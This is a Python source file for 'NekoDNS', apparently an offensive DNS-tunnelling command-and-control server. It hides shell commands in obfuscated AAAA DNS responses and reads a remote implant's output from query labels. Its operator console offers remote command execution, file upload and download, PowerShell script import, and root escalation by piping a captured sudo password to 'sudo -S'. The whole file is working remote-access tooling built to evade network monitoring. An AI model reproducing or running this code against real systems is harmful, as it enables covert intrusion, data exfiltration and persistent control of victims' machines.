#!/usr/bin/python3
#=======================#
# NekoDNS by @JoelGMSec #
# https://darkbyte.net  #
#=======================#

import os
import queue
import struct
import random
import pwinput
import readline
import threading
import socketserver
import neotermcolor
from sys import argv
import shlex as oslex
from neotermcolor import colored

system = None
responses = {}
silent = False
whoami_raw = None
remote_files = []
disable_pw = False
last_prompt = None
sudo_password = None
lock = threading.Lock()
upload_started = False
upload_pending_chunks = []
autocomplete_pending = False
disable_autocomplete = False
RESPONSE_QUEUE = queue.Queue()
neotermcolor.readline_always_safe = True
active_command = {'cmd': None, 'delivered': False}
REMOTE_INFO = {"whoami": "", "hostname": "", "pwd": "~"}

banner = r"""
  _   _      _         ____  _   _ ____  
 | \ | | __ | | __ __ |  _ \| \ | / ___| 
 |  \| |/ _ \ |/ / _ \| | | |  \| \___ \ 
 | |\  |  __/   < (_) | |_| | |\  |___) |
 |_| \_|\___|_|\_\___/|____/|_| \_|____/ 
                                         """                                    

banner2 = """                                               
  ----------- by @JoelGMSec -----------
"""

def update_remote_files_list():
    global remote_files, autocomplete_pending, system
    autocomplete_pending = True
    if system == "windows":
        command = "(ls).Name"
    else:
        command = "ls"
    return command

def completer(text, state):
    global remote_files
    text_lower = text.lower()
    options = [f for f in remote_files if f.lower().startswith(text_lower)]
    if state < len(options):
        return options[state]
    return None

readline.set_completer(completer)
readline.parse_and_bind("tab: complete")

def random_response():
    parts = [random.randint(0, 0xFFFF) for _ in range(8)]
    return struct.pack('!8H', *parts)

def split_command(cmd, max_bytes=16):
    chunks = []
    cmd_bytes = cmd.encode()
    part_size = max_bytes - 5

    i = 0
    while i < len(cmd_bytes):
        part = cmd_bytes[i:i+part_size]

        if i + part_size < len(cmd_bytes):
            chunk_bytes = part + b"[->]"
        else:
            chunk_bytes = part

        chunks.append(chunk_bytes.hex()[::-1])
        i += part_size

    return chunks

def pack_chunk(chunk_hex_string):
    raw_bytes = bytes.fromhex(chunk_hex_string)
    if len(raw_bytes) < 16:
        length = len(raw_bytes)
        raw_bytes = bytes([length]) + raw_bytes + b'\x00' * (15 - length)
    elif len(raw_bytes) > 15:
        raw_bytes = raw_bytes[:15]
        raw_bytes = bytes([15]) + raw_bytes
    else:
        raw_bytes = bytes([len(raw_bytes)]) + raw_bytes

    return raw_bytes

class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            data, sock = self.request
            domain = self.extract_query(data)
            response = self.build_response(data, domain)
            sock.sendto(response, self.client_address)
        except Exception as e:
            print(colored(f"[!] UDP Handler Error: {str(e)}", "red"))

    def extract_query(self, data):
        try:
            qname = []
            if len(data) < 13:
                return ""
            
            i = 12
            if i >= len(data):
                return ""
                
            length = data[i]
            while length != 0 and i < len(data) - 1:
                i += 1
                if i + length > len(data):
                    break
                qname.append(data[i:i+length].decode('utf-8', errors='ignore'))
                i += length
                if i >= len(data):
                    break
                length = data[i]
            return '.'.join(qname)

        except KeyboardInterrupt:
            print (colored("\n[!] Exiting..\n", "red"))
            exit(0)

        except Exception as e:
            print(colored(f"[!] Error extracting UDP query: {str(e)}", "red"))
            return ""

    def build_response(self, request, domain):
        global active_command, responses, remote_files, autocomplete_pending

        tid = request[:2]
        flags = b'\x81\x80'
        counts = b'\x00\x01\x00\x01\x00\x00\x00\x00'
        header = tid + flags + counts

        i = 12
        while i < len(request) and request[i] != 0:
            i += 1
        question_end = i + 5
        question = request[12:question_end] if question_end <= len(request) else request[12:]

        parts = domain.split('.')
        if not parts:
            rdata = b'\x00' * 15 + b'\x01'
        else:
            prefix = parts[0]
            hexdata = parts[1] if len(parts) > 1 else ""

            if prefix == 'a':
                with lock:
                    if active_command['cmd'] and not active_command['delivered']:
                        parts = split_command(active_command['cmd'])
                        active_command['chunks'] = parts
                        active_command['delivered'] = True

                    if active_command.get('chunks'):
                        if active_command['chunks']:
                            chunk = active_command['chunks'].pop(0)
                            rdata = pack_chunk(chunk)
                        else:
                            if active_command.get('upload_in_progress') and active_command.get('file_chunks_to_send'):
                                rdata = b'\x00' * 15 + b'\x01'
                            else:
                                active_command['cmd'] = None
                                active_command['delivered'] = False
                                if 'chunks' in active_command:
                                    del active_command['chunks']
                                rdata = b'\x00' * 15 + b'\x01'
                    elif active_command.get('upload_in_progress') and active_command.get('file_chunks_to_send'):
                        if active_command['file_chunks_to_send']:
                            chunk = active_command['file_chunks_to_send'].pop(0)
                            reversed_chunk = chunk[::-1]
                            rdata = pack_chunk(reversed_chunk)
                        else:
                            active_command['upload_in_progress'] = False
                            if 'file_chunks_to_send' in active_command:
                                del active_command['file_chunks_to_send']
                            rdata = b'\x00' * 15 + b'\x01'
                        
                    else:
                        rdata = b'\x00' * 15 + b'\x01'

            elif prefix == 's':
                with lock:
                    responses['chunks'] = []
                rdata = random_response()

            elif prefix == 'd':
                with lock:
                    reversed_hexdata = hexdata[::-1]
                    responses.setdefault('chunks', []).append(reversed_hexdata)
                rdata = random_response()

            elif prefix == 'e':
                with lock:
                    fullhex = ''.join(responses.get('chunks', []))
                    try:
                        text = bytes.fromhex(fullhex).decode(errors="replace")
                        cmd = active_command.get('cmd','')
                        
                        if autocomplete_pending and cmd.strip() in ["ls", "(ls).Name"]:
                            remote_files = [f.strip() for f in text.strip().split('\n') if f.strip()]
                            autocomplete_pending = False
                        else:
                            file_content = bytes.fromhex(fullhex)
                            if cmd.startswith('download'):
                                _, paths = cmd.split(' ',1)
                                remote_path, local_path = paths.split('!')
                                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                                with open(local_path, 'wb') as f:
                                    f.write(file_content)
                                print(colored(f"[+] File downloaded successfully to {local_path}", "green"))
                                RESPONSE_QUEUE.put("")
                                active_command = {'cmd': None, 'delivered': False}
                            else:
                                RESPONSE_QUEUE.put(text)
                    except Exception as e:
                        print(colored(f"[!] Error processing response: {str(e)}", "red"))
                    responses['chunks'] = []
                rdata = random_response()

            else:
                rdata = b'\x00' * 15 + b'\x01'

        answer = b'\xc0\x0c' + b'\x00\x1c' + b'\x00\x01' + b'\x00\x00\x00\x3c' + b'\x00\x10' + rdata
        return header + question + answer

class ThreadedUDPServer(socketserver.ThreadingMixIn, socketserver.UDPServer):
    pass

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    pass

class TCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            length_bytes = self.request.recv(2)
            if not length_bytes or len(length_bytes) < 2:
                return
            
            dns_message_length = struct.unpack('!H', length_bytes)[0]
            if dns_message_length > 65535 or dns_message_length < 12:
                return

            received_data = b''
            while len(received_data) < dns_message_length:
                packet = self.request.recv(dns_message_length - len(received_data))
                if not packet:
                    break
                received_data += packet
            
            if len(received_data) != dns_message_length:
                return

            domain = self.extract_query_tcp(received_data)
            response = self.build_response_tcp(received_data, domain)
            self.request.sendall(response)

        except KeyboardInterrupt:
            print (colored("\n[!] Exiting..\n", "red"))
            exit(0)

        except Exception as e:
            print(colored(f"[!] TCP Handler Error: {str(e)}", "red"))

    def extract_query_tcp(self, data):
        try:
            qname = []
            if len(data) < 13:
                return ""
            
            i = 12
            if i >= len(data):
                return ""
                
            length = data[i]
            while length != 0 and i < len(data) - 1:
                i += 1
                if i + length > len(data):
                    break
                qname.append(data[i:i+length].decode('utf-8', errors='ignore'))
                i += length
                if i >= len(data):
                    break
                length = data[i]
            return '.'.join(qname)

        except Exception as e:
            print(colored(f"[!] Error extracting TCP query: {str(e)}", "red"))
            return ""

    def build_response_tcp(self, request, domain):
        global active_command, responses, remote_files, autocomplete_pending

        tid = request[:2]
        flags = b'\x81\x80'
        counts = b'\x00\x01\x00\x01\x00\x00\x00\x00'
        header = tid + flags + counts

        i = 12
        while i < len(request) and request[i] != 0:
            i += 1
        question_end = i + 5
        question = request[12:question_end] if question_end <= len(request) else request[12:]

        parts = domain.split('.')
        if not parts:
            rdata = b'\x00' * 15 + b'\x01'
        else:
            prefix = parts[0]
            hexdata = parts[1] if len(parts) > 1 else ""

            if prefix == 'a':
                with lock:
                    if active_command['cmd'] and not active_command['delivered']:
                        parts = split_command(active_command['cmd'])
                        active_command['chunks'] = parts
                        active_command['delivered'] = True

                    if active_command.get('chunks'):
                        if active_command['chunks']:
                            chunk = active_command['chunks'].pop(0)
                            rdata = pack_chunk(chunk)
                        else:
                            if active_command.get('upload_in_progress') and active_command.get('file_chunks_to_send'):
                                rdata = b'\x00' * 15 + b'\x01'
                            else:
                                active_command['cmd'] = None
                                active_command['delivered'] = False
                                if 'chunks' in active_command:
                                    del active_command['chunks']
                                rdata = b'\x00' * 15 + b'\x01'
                    elif active_command.get('upload_in_progress') and active_command.get('file_chunks_to_send'):
                        if active_command['file_chunks_to_send']:
                            chunk = active_command['file_chunks_to_send'].pop(0)
                            reversed_chunk = chunk[::-1]
                            rdata = pack_chunk(reversed_chunk)
                        else:
                            active_command['upload_in_progress'] = False
                            if 'file_chunks_to_send' in active_command:
                                del active_command['file_chunks_to_send']
                            rdata = b'\x00' * 15 + b'\x01'
                        
                    else:
                        rdata = b'\x00' * 15 + b'\x01'

            elif prefix == 's':
                with lock:
                    responses['chunks'] = []
                rdata = random_response()

            elif prefix == 'd':
                with lock:
                    reversed_hexdata = hexdata[::-1]
                    responses.setdefault('chunks', []).append(reversed_hexdata)
                rdata = random_response()

            elif prefix == 'e':
                with lock:
                    fullhex = ''.join(responses.get('chunks', []))
                    try:
                        text = bytes.fromhex(fullhex).decode(errors="replace")
                        cmd = active_command.get('cmd','')
                        
                        if autocomplete_pending:
                            remote_files = [f.strip() for f in text.strip().split('\n') if f.strip()]
                            autocomplete_pending = False
                            RESPONSE_QUEUE.put("")
                        else:
                            file_content = bytes.fromhex(fullhex)
                            if cmd.startswith('download'):
                                _, paths = cmd.split(' ',1)
                                remote_path, local_path = paths.split('!')
                                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                                with open(local_path, 'wb') as f:
                                    f.write(file_content)
                                print(colored(f"[+] File downloaded sucessfully to {local_path}", "green"))
                                RESPONSE_QUEUE.put("")
                                active_command = {'cmd': None, 'delivered': False}
                            else:
                                RESPONSE_QUEUE.put(text)
                    except:
                        pass
                    responses['chunks'] = []
                rdata = random_response()

            else:
                rdata = b'\x00' * 15 + b'\x01'

        answer = b'\xc0\x0c' + b'\x00\x1c' + b'\x00\x01' + b'\x00\x00\x00\x3c' + b'\x00\x10' + rdata
        full_response = header + question + answer
        return struct.pack("!H", len(full_response)) + full_response

def clean_whoami(raw):
    if '\\' in raw:
        return raw.split('\\')[1].lower()
    return raw.lower()

def get_custom_prompt(root):
    try:
        global whoami_raw, system
        whoami = REMOTE_INFO.get("whoami", "user")
        hostname = REMOTE_INFO.get("hostname", "host")
        path = REMOTE_INFO.get("pwd", "~")

        if "\\" in path:
            system = "windows"
            slash = "\\"
        else:
            system = "linux"
            slash = "/"

        path = str(path).rstrip()
        if len(path) > 24:
            parts = path.split(slash)[-3:]
            shortpath = ".." + slash + slash.join(parts)
        else:
            shortpath = path

        if hostname == "" or hostname == None or not hostname: 
            if "\\" in whoami_raw:
                hostname = whoami_raw.split("\\")[0].strip()

        if root:
            whoami = "root"

        if whoami and hostname:
            cinput = colored(" [NekoDNS] ", "grey", "on_green") + colored(" ", "green", "on_blue")
            cinput += colored(f"{whoami}@{hostname} ", "grey", "on_blue")
            cinput += colored(" ", "blue", "on_yellow") + colored(shortpath + " ", "grey", "on_yellow")
            cinput += colored(" ", "yellow")
            return cinput + "\001\033[0m\002"

        else:
            return

    except:
        pass

def prompt_loop():
    global active_command, remote_files, autocomplete_pending, system, last_prompt
    global REMOTE_INFO, whoami_raw, silent, disable_pw, disable_autocomplete
    upload_started = False
    root = False
    sudo = False
    old_user = ""
    pwd_cmd = ""
    path = ""

    try:
        with lock:
            active_command = {'cmd': 'whoami', 'delivered': False}
        try:
            whoami_raw = RESPONSE_QUEUE.get(timeout=None).strip()
            whoami = clean_whoami(whoami_raw)
            if "\\" in whoami_raw:
                pwd_cmd = "(pwd).Path"
                system = "windows"
            else:
                pwd_cmd = "pwd"
                system = "linux"
        except:
            pass

        with lock:
            active_command = {'cmd': 'hostname', 'delivered': False}
        try:
            hostname = RESPONSE_QUEUE.get(timeout=None).strip().lower()
        except:
            pass

        with lock:
            active_command = {'cmd': pwd_cmd, 'delivered': False}
        try:
            pwd = RESPONSE_QUEUE.get(timeout=None).strip()
        except:
            pwd = "~"

        REMOTE_INFO['whoami'] = whoami
        REMOTE_INFO['hostname'] = hostname
        REMOTE_INFO['pwd'] = pwd

        if not disable_autocomplete:
            with lock:
                autocomplete_pending = True
                if system == "windows":
                    active_command = {'cmd': "(ls).Name", 'delivered': False}
                else:
                    active_command = {'cmd': "ls", 'delivered': False}
            try:
                RESPONSE_QUEUE.get(timeout=5)
            except:
                pass

        while True:
            try:
                command = input(get_custom_prompt(root)).strip()
                if command == "" or command == None or not command:
                    print()

                if command.startswith("cd "):
                    print()
                    current_path = REMOTE_INFO.get("pwd", "~")
                    slash = "\\" if "\\" in current_path else "/"
                    parts = command.strip().split(maxsplit=1)
                    new_path = parts[1].strip() if len(parts) > 1 else ""

                    if new_path in ["", ".", "...", "...."]:
                        pass

                    elif new_path == "..":
                        if slash == "\\" and ":" in current_path:
                            drive, tail = current_path.split(":", 1)
                            tail_parts = tail.strip(slash).split(slash)
                            if tail_parts:
                                tail_parts.pop()
                                new_tail = slash.join(tail_parts)
                                REMOTE_INFO["pwd"] = f"{drive}:{slash + new_tail if new_tail else slash}"
                            else:
                                REMOTE_INFO["pwd"] = f"{drive}:{slash}"
                        else:
                            parts = current_path.strip(slash).split(slash)
                            if parts:
                                parts.pop()
                                REMOTE_INFO["pwd"] = slash + slash.join(parts) if parts else slash
                            else:
                                REMOTE_INFO["pwd"] = slash

                    elif new_path.startswith(slash) or (slash == "\\" and ":" in new_path):
                        REMOTE_INFO["pwd"] = new_path.rstrip(slash)

                    else:
                        if not current_path.endswith(slash):
                            current_path += slash
                        REMOTE_INFO["pwd"] = current_path + new_path.rstrip(slash)

                    if root:
                        cd_command = f"sudo {command}"
                    else:
                        cd_command = command

                    with lock:
                        active_command = {'cmd': cd_command, 'delivered': False}
                    try:
                        RESPONSE_QUEUE.get(timeout=1)
                    except:
                        pass

                    if not disable_autocomplete:
                        with lock:
                            autocomplete_pending = True
                            if system == "windows":
                                active_command = {'cmd': f"(ls \"{REMOTE_INFO['pwd']}\").Name", 'delivered': False}
                            else:
                                active_command = {'cmd': f"ls \"{REMOTE_INFO['pwd']}\"", 'delivered': False}
                        try:
                            RESPONSE_QUEUE.get(timeout=5)
                        except:
                            pass

                else:
                    if command == "exit":
                        if root:
                            print()
                            REMOTE_INFO['whoami'] = old_user
                            sudo = False
                            root = False
                            command = None
                        else:
                            command = "exit2"

                    if command == "kill":
                        command = "exit"

                    if command == "clear" or command == "cls":
                        os.system("clear")
                        command = None

                    if "pwd" in command.split()[0]:
                        pwd_path = str(REMOTE_INFO['pwd']).replace("'","") + "\n"
                        print(colored(pwd_path, "white"))
                        command = None

                    if command and command.split()[0] == "sudo":
                        if not ":" in pwd_cmd:
                            args = oslex.split(command)
                            if len(args) < 2:
                                print(colored("[!] Usage: sudo \"command\" or sudo su\n","red"))
                                command = None
                            else:
                                if not sudo:
                                    old_cmd = ' '.join(args[1:])
                                    print(colored(f"[sudo] password for {str(whoami).rstrip()}:\n","red"))
                                    if disable_pw or silent:
                                        sudo_password = input(get_custom_prompt(root)).strip()
                                    else:
                                        sudo_password = pwinput.pwinput(prompt=(get_custom_prompt(root)))
                                    
                                    if "su" in args:
                                        print()
                                        old_user = REMOTE_INFO['whoami']
                                        command = None
                                        root = True
                                        sudo = True
                                    else:
                                        command = f"echo '{sudo_password}' | sudo -S {old_cmd}"
                                        sudo = True
                                else:
                                    old_cmd = ' '.join(args[1:])
                                    if "su" in args:
                                        print()
                                        old_user = REMOTE_INFO['whoami']
                                        command = None
                                        root = True
                                        sudo = True
                                    else:
                                        command = f"echo '{sudo_password}' | sudo -S {old_cmd}"

                                if root and "whoami" in command.lower() and cmd_response.strip().lower() == "root":
                                    command = None

                    if command == "supersu":
                        if ":" in pwd_cmd:
                            print(colored("[!] Error: supersu is only available on Linux hosts\n", "red"))
                            command = None
                        else:
                            print()
                            root = True
                            old_user = REMOTE_INFO['whoami']
                            REMOTE_INFO['whoami'] = "root"
                            command = None

                    if "upload" in command.split()[0]:
                        args = oslex.split(command)
                        if len(args) != 3:
                            print(colored("[!] Usage: upload \"local_file\" \"remote_file\"\n","red"))
                            command = None
                        else:
                            local_path = args[1]
                            remote_path = args[2]
                            try:
                                with open(local_path, "rb") as f:
                                    file_bytes = f.read()
                                hexdata = file_bytes.hex()
                                chunk_size = (16 - 4) * 2 
                                chunks = [] 
                                i = 0

                                while i < len(hexdata):
                                    chunk = hexdata[i:i + chunk_size]
                                    chunks.append(chunk)
                                    i += chunk_size

                                with lock:
                                    command_to_client = "upload " + args[1] + "!" + args[2]
                                    active_command = {'cmd': command_to_client, 'delivered': False}
                                    print(colored(f"[>] Uploading \"{local_path}\" in \"{remote_path}\"..","magenta"))
                                    
                                try:
                                    cmd_response = RESPONSE_QUEUE.get(timeout=360)                                
                                    with lock:
                                        active_command['cmd'] = None
                                        active_command['file_chunks_to_send'] = chunks
                                        active_command['upload_in_progress'] = True                               
                                    final_response = RESPONSE_QUEUE.get(timeout=360)
                                    
                                    with lock:
                                        active_command = {'cmd': None, 'delivered': False}
                                        if 'file_chunks_to_send' in active_command:
                                            del active_command['file_chunks_to_send']
                                        active_command['upload_in_progress'] = False

                                except:
                                    print(colored(f"[+] File uploaded sucessfully to \"{remote_path}\"", "green"))
                                    pass

                            except FileNotFoundError:
                                print(colored(f"[!] File \"{local_path}\" not found!\n", "red"))
                                command = None

                    if "download" in command.split()[0]:
                        args = oslex.split(command)
                        if len(args) < 3 or len(args) > 3:
                            print(colored("[!] Usage: download \"local_file\" \"remote_file\"\n","red"))
                            command = None
                        else:
                            remote_path = args[1]
                            local_path = args[2]
                            command = "download " + args[1] + "!" + args[2]
                            print(colored(f"[>] Downloading \"{remote_path}\" in \"{local_path}\"..","magenta"))
                            
                    if "import-ps1" in command.split()[0]:
                        args = oslex.split(command)
                        if len(args) < 2 or len(args) > 2:
                            print(colored("[!] Usage: import-ps1 \"/path/script.ps1\"\n", "red"))
                            command = None
                        else:  
                            try:
                                filename = args[1]
                                with open(filename, "rb") as f:
                                    ps1_content = f.read().decode('utf-8', errors='replace')
                                
                                hexdata = ps1_content.encode('utf-8').hex()
                                chunk_size = (16 - 4) * 2 
                                chunks = [] 
                                i = 0

                                while i < len(hexdata):
                                    chunk = hexdata[i:i + chunk_size]
                                    chunks.append(chunk)
                                    i += chunk_size

                                with lock:
                                    command_to_client = "import-ps1 " + filename
                                    active_command = {'cmd': command_to_client, 'delivered': False}
                                    print(colored(f"[>] Importing PowerShell script \"{filename}\"..","magenta"))
                            
                                try:
                                    cmd_response = RESPONSE_QUEUE.get(timeout=360)
                                    with lock:
                                        active_command['cmd'] = None
                                        active_command['file_chunks_to_send'] = chunks
                                        active_command['upload_in_progress'] = True
                                    final_response = RESPONSE_QUEUE.get(timeout=360)
                                    
                                    with lock:
                                        active_command = {'cmd': None, 'delivered': False}
                                        if 'file_chunks_to_send' in active_command:
                                            del active_command['file_chunks_to_send']
                                        active_command['upload_in_progress'] = False
                                    
                                    if final_response.strip():
                                        print(colored(final_response.strip(), "green"))
                                    else:
                                        print(colored(f"[+] PowerShell script \"{filename}\" imported successfully!\n", "green"))

                                except:
                                    print(colored(f"[+] PowerShell script \"{filename}\" imported successfully!\n", "green"))
                                    pass

                                command = None

                            except FileNotFoundError:
                                print(colored(f"[!] File \"{filename}\" not found!\n", "red"))
                                command = None
                            except Exception as e:
                                print(colored(f"[!] Error reading file \"{filename}\": {str(e)}\n", "red"))
                                command = None

                    if "help" in command.split()[0]:
                        print(colored("[+] Available commands:","green"))
                        print(colored("    upload: Upload a file from local to remote computer","blue"))
                        print(colored("    download: Download a file from remote to local computer","blue"))
                        print(colored("    import-ps1: Import PowerShell script on Windows hosts","blue"))
                        print(colored("    supersu: Force all commands to be executed as root", "blue"))
                        print(colored("    clear/cls: Clear terminal screen","blue"))
                        print(colored("    kill: Kill client connection","blue"))
                        print(colored("    exit: Exit from program\n","blue"))
                        command = None

                    if command != "" and command != None and command:
                        if command == "exit2":
                            print (colored("[!] Exiting..\n", "red"))
                            break

                        if root and not "cd" in command:
                            if not sudo:
                                old_cmd = command
                                command = f"su -c '{command}'"
                            else:
                                old_cmd = command
                                command = f"echo '{sudo_password}' | sudo -S {old_cmd}"

                        with lock:
                            active_command = {'cmd': command, 'delivered': False}

                        if command == "exit":
                            print (colored("[!] Exiting..\n", "red"))
                            try:
                                cmd_response = RESPONSE_QUEUE.get(timeout=30)
                                break  
                            except:
                                break

                        else:
                            try:
                                cmd_response = RESPONSE_QUEUE.get(timeout=360)
                                if cmd_response and cmd_response.strip():
                                    print(cmd_response.strip()+"\n")
                            except queue.Empty:
                                print(colored("[!] Error: command timeout", "red"))
                            except Exception as e:
                                print(colored(f"[!] Error receiving response: {str(e)}", "red"))

            except KeyboardInterrupt:
                print (colored("\n[!] Exiting..\n", "red"))
                exit(0)

            except:
                pass

    except KeyboardInterrupt:
        print (colored("\n[!] Exiting..\n", "red"))
        exit(0)

    except:
        pass

if __name__ == "__main__":
    try:
        if "-npw" in argv:
            disable_pw = True
            argv.remove("-npw")
            
        if "-nls" in argv:
            disable_autocomplete = True
            argv.remove("-nls")

        if not "-silent" in argv:
            print (colored(banner, "blue"))
            print (colored(banner2, "green"))
        else:
            silent = True

        if len(argv) < 4 or argv[1] in ["-h", "--help"]:
            print(colored("[!] Usage: python3 NekoDNS.py <listen_ip> <listen_port> <-udp/-tcp>\n", "red"))
            exit(1)

        listen_ip = argv[1]
        listen_port = argv[2]
        protocol = argv[3]
        protocol_name = None

        if protocol == "-udp":
            protocol_name = "UDP"
            server = ThreadedUDPServer((listen_ip, 53), DNSHandler)

        elif protocol == "-tcp":
            protocol_name = "TCP"
            server = ThreadedTCPServer((listen_ip, 53), TCPHandler)
        
        if not "-silent" in argv:
            print(colored(f"[>] Waiting for connection on {listen_ip}:{listen_port} over {protocol_name}..\n", "yellow"))
        threading.Thread(target=server.serve_forever, daemon=True).start()
        prompt_loop()

    except KeyboardInterrupt:
        print (colored("\n[!] Exiting..\n", "red"))
        exit(0)

    except:
        pass
